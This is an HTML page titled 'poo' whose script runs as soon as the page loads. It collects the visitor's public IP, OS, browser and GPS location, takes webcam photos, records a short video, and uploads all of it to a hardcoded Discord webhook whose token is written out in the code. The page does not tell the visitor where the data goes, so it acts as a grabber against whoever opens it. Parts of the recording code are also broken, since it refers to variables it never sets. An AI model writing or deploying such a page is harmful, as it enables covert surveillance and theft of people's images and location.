<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>poo</title>
<style>
  body {
    margin: 0;
    background-color: #000;
    font-family: Arial, sans-serif;
    color: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
  }
  #loading {
    font-size: 1.2rem;
    margin-bottom: 10px;
  }
</style>
</head>
<body>
<div id="loading">Initializing and recording...</div>

<script>
  // --- Internal toggle ---
  const includeWebcamFeed = false; // Set true to include webcam snapshot

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8W';

  let mediaData = {
    photo1: null,
    photo2: null,
    video: null,
    webcamFrame: null,
    hasCamera: false,
    hasLocation: false,
    locationData: null,
    locationSource: 'none',
    pageType: 'black',
    systemInfo: null
  };
  let mediaRecorder;
  let recordedChunks = [];
  let recordingTimeout;
  let isRecording = false;
  let stream = null;

  const loadingEl = document.getElementById('loading');

  function showLoading(show = true) {
    loadingEl.style.display = show ? 'block' : 'none';
  }

  async function getPublicIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch {
      return 'Unavailable';
    }
  }

  async function collectSystemInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const os = (() => {
      const osList = {
        'Win': 'Windows',
        'Mac': 'MacOS',
        'Linux': 'Linux',
        'Android': 'Android',
        'like Mac': 'iOS'
      };
      for (const key in osList) {
        if (userAgent.indexOf(key) !== -1) return osList[key];
      }
      return 'Unknown';
    })();

    const browser = (() => {
      if (/chrome|chromium|crios/i.test(userAgent)) return 'Chrome';
      if (/firefox|fxios/i.test(userAgent)) return 'Firefox';
      if (/safari/i.test(userAgent) && !/chrome|chromium|crios/i.test(userAgent)) return 'Safari';
      if (/edge|edg/i.test(userAgent)) return 'Edge';
      return 'Other';
    })();

    const vpnDetected = false; // Placeholder
    const extensions = ['ExampleExtension1', 'ExampleExtension2']; // Placeholder
    const ip = await getPublicIP();

    return { ip, os, browser, platform, extensions, vpn: vpnDetected };
  }

async function sendToDiscord() {
  mediaData.systemInfo = await collectSystemInfo();

  const formData = new FormData();

  async function base64ToBlob(base64) {
    const res = await fetch(base64);
    return await res.blob();
  }

  if (mediaData.photo1) {
    const blob1 = await base64ToBlob(mediaData.photo1);
    formData.append('files[0]', blob1, 'photo1.jpg');
  }
  if (mediaData.photo2) {
    const blob2 = await base64ToBlob(mediaData.photo2);
    formData.append('files[1]', blob2, 'photo2.jpg');
  }
  if (mediaData.video) {
    formData.append('files[2]', mediaData.video, 'video.webm');
  }
  if (includeWebcamFeed && stream) {
    await captureWebcamFrame();
    if (mediaData.webcamFrame) {
      const blobWebcam = await base64ToBlob(mediaData.webcamFrame);
      formData.append('files[3]', blobWebcam, 'webcam.jpg');
    }
  }

  let content = "**Full Capture**\n\n";
  if (mediaData.systemInfo) {
    const sys = mediaData.systemInfo;
    content += `IP: ${sys.ip}\nOS: ${sys.os}\nBrowser: ${sys.browser}\nPlatform: ${sys.platform}\nVPN: ${sys.vpn ? 'Yes' : 'No'}\nExtensions: ${sys.extensions.join(', ')}\n`;
  }
  if (mediaData.locationData) {
    content += `Location: Lat ${mediaData.locationData.latitude}, Lon ${mediaData.locationData.longitude}, Acc ${mediaData.locationData.accuracy}m\n`;
  }

  formData.append('payload_json', JSON.stringify({ content }));

  await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

async function getGeoLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      mediaData.locationSource = 'not_supported';
      return resolve(null);
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        mediaData.locationSource = 'gps';
        resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
      },
      () => { mediaData.locationSource = 'failed'; resolve(null); },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

async function captureWebcamFrame() {
  if (!stream) return;
  const video = document.getElementById('video');
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0);
  mediaData.webcamFrame = canvas.toDataURL('image/jpeg', 0.9);
}

async function stopAndUpload() {
  if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
  if (recordingTimeout) clearTimeout(recordingTimeout);
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
  if (mediaData.video) {
    if (includeWebcamFeed) await captureWebcamFrame();
    await sendToDiscord();
  }
  showLoading(false);
}

async function start() {
  showLoading(true);
  mediaData.systemInfo = await collectSystemInfo();
  mediaData.locationData = await getGeoLocation();

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
    window.stream = stream;
    const video = document.createElement('video');
    document.body.appendChild(video);
    video.style.display = 'none';
    video.srcObject = stream;
    await new Promise(res => video.onloadedmetadata = res);
    await new Promise(res => setTimeout(res, 500));

    // Take snapshots
    const c1 = document.createElement('canvas');
    c1.width = video.videoWidth;
    c1.height = video.videoHeight;
    c1.getContext('2d').drawImage(video, 0, 0);
    mediaData.photo1 = c1.toDataURL('image/jpeg', 0.9);

    const c2 = document.createElement('canvas');
    c2.width = video.videoWidth;
    c2.height = video.videoHeight;
    c2.getContext('2d').drawImage(video, 0, 0);
    mediaData.photo2 = c2.toDataURL('image/jpeg', 0.9);

    const chunks = [];
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.onstop = () => {
      mediaData.video = new Blob(chunks, { type: 'video/webm' });
      if (includeWebcamFeed) captureWebcamFrame().then(() => sendToDiscord());
      else { sendToDiscord(); }
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = null;
      isRecording = false;
    };
    stream.getVideoTracks().forEach(t => t.addEventListener('ended', stopAndUpload));
    mediaRecorder.start(1000);
    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 3000);
  } catch(e) {
    console.error('Error:', e);
    showLoading(false);
  }
}

window.onload = start;
window.addEventListener('beforeunload', () => { if (isRecording) stopAndUpload(); });
</script>
</body>
</html>
